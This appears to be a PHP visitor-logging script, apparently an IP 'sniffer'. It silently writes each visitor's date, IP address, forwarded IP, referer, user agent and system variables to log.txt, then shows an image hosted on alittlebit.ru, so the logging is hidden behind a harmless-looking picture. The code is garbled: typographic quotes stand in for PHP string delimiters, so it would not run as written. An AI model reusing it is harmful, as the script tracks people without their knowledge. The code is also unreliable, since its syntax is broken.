

<?
$date=date(«[D|d/m/Y|H:i]»);
$ip=getenv(«Remote_addr»);
$real_ip=getenv(«HTTP_X_FORWARDED_FOR»);
$otkuda=getenv(«HTTP_REFERER»);
$browser=getenv(«HTTP_USER_AGENT»);
$win=getenv(«windir»);
$uid=implode($argv,» «);

echo $date;

$fp=fopen(«log.txt»,»a»);
fputs($fp,»$date\t|$uid|\t$ip($real_ip)\t$browser\t$otkuda\t$win\n»);
fclose($fp);

print (» <img src=’http://alittlebit.ru/upload/iblock/2e2/303a6acabe48fa7dfd52628b9f98fbbf.jpeg’> «);
?>